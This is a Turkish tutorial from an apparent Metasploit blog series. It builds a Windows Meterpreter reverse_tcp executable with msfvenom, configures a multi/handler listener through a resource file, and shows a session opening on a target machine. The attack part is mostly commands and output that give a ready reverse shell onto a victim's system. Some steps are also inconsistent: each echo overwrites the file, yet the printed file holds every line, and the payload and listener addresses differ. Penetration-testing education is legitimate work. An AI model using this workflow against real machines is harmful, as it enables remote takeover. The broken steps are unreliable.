---
draft: false
title:  MSF Meterpreter Script Yazma
linkTitle: MSF Meterpreter Script Yazma
translationKey: msf-meterpreter-script-writing
weight: 370
date: 2017-06-14T13:47:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description:  MSF Meterpreter Script Yazma ile ilgili detaylı bilgileri bu yazıda bulabilirsiniz.
url:  /tr/msf-meterpreter-script-yazma/ 
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
## Script Yazma

Öncelile, yeni bir script yazarken dikkat edilmesi gereken bir takım kuralları görelim.
  
* Tüm Windows sürümleri aynı değildir.

* Bazı Windows sürümleri, güvenlik tedbirleri barındırırlar.

* Windows Scriptleri, sürüme bağlı olarak farklı davranış gösterirler.

* Script yazarken Windows sürümüne özel davranmanız gerekebilir.

Yukarıda belirtilen kuralları göz önünde bulundurarak, hedefe özel script yazmak gerekmektedir. Bu durumda yazacağımız script doğru çalışabilir.

Şimdi, aşağıdaki komut ile çalıştırılabilir bir .exe dosyası oluşturalım. Bu program, hedef sistemde çalışacak ve yerel bilgisayarımıza reverse bağlantı açacaktır.

```bash
root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
Saved as: Meterpreter.exe
```

Gerekli .exe dosyamız oluşturuldu. Bu dosya hedef windows işletim sistemi içinde çalışacak ve yerel bilgisayara iletişim sağlayacaktır. O zaman bizim yerel bilgisayarda dinleyici oluşturmamız gerekmektedir. Dinleyicimizi oluşturalım.

```bash
root@kali:~# touch meterpreter.rc
root@kali:~# echo use exploit/multi/handler > meterpreter.rc
root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp > meterpreter.rc
root@kali:~# echo set LHOST 192.168.1.184 > meterpreter.rc
root@kali:~# echo set ExitOnSession false > meterpreter.rc
root@kali:~# echo exploit -j -z > meterpreter.rc
root@kali:~# cat meterpreter.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.184
set ExitOnSession false
exploit -j -z
```

Dikkat ederseniz komutlarla, multi handler modülünü dinleyici olarak ayarladık. Payload modülü olarak reverse_tcp modülü kulandık. Yerel IP adresi olarak 192.168.1.184 ayarladık.

Yeni yazdığımız scriptleri `/usr/share/metasploit-framework/scripts/meterpreter` klasörüne kayıt edersek, kolayca kullanabiliriz.

Şimdi yapmamız gereken, `msfconsole` programını yeni oluşturduğumuz `meterpreter.rc` dosyasını kaynak göstererek başlatmak.

```bash
root@kali:~# msfconsole -r meterpreter.rc

       [ metasploit v4.8.2-2014021901 [core:4.8 api:1.0] ]
+ -- --[ 1265 exploits - 695 auxiliary - 202 post ]
+ -- --[ 330 payloads - 32 encoders - 8 nops      ]

resource> use exploit/multi/handler
resource> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource> set LHOST 192.168.1.184
LHOST => 192.168.1.184
resource> set ExitOnSession false
ExitOnSession => false
resource> exploit -j -z
> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Starting the payload handler...
```

Yukarıda gördüğünüz gibi Metasploit Framework dinleme yaparak başlamıştır. Artık, oluşturduğumuz .exe dosyasını Windows içerisinde çalıştırdığımızda, oturum aktif hale gelecektir.

```bash
> Sending stage (718336 bytes)
> Meterpreter session 1 opened (192.168.1.158:4444 -> 192.168.1.104:1043)

msf exploit(handler) > sessions -i 1
> Starting interaction with 1...

meterpreter >
```
